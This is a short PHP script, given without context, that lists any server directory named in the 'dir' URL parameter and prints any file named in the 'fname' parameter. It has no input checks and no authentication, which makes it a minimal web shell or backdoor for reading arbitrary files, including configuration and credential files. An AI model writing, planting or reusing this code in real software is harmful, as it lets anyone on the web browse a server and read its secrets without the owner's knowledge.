<?php
$a=$_GET['dir'];
if ($handle = opendir($a)) {
?><pre><?php
    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "$entry\n";
        }
    }

    closedir($handle);
}
?>
</pre>
<?php
if(!empty($_GET['fname'])){
    echo "<pre>";
    echo readfile($_GET['fname']);
    echo "</pre>";
}

